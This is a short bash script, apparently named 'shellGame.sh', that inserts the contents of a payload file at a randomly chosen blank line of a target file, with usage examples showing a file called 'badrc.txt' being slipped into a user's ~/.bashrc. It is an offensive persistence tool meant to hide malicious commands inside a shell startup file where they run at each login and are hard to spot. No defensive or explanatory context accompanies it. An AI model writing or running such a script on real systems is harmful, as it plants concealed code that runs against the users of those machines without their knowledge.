#!/bin/bash

## Usage: ./shellGame.sh <PAYLOAD> <DEST_FILE>
## Usage: ./shellGame.sh ./badrc.txt ~/.bashrc
## Usage: ./shellGame.sh ./badrc.txt

PAYLOAD="${1}"
DEST_FILE="${2}"

## Find a random blank line:
TARGET_LINE=$(grep -E --line-number '^$' "${DEST_FILE}" | sort -R | head -n 1 | sed 's/://g' || sed -n '/^$/=' "${DEST_FILE}" | sort -R | head -n 1)

## Insert <PAYLOAD> after <TARGET_LINE>
sed -i "${TARGET_LINE}r ${PAYLOAD}" "${DEST_FILE}"
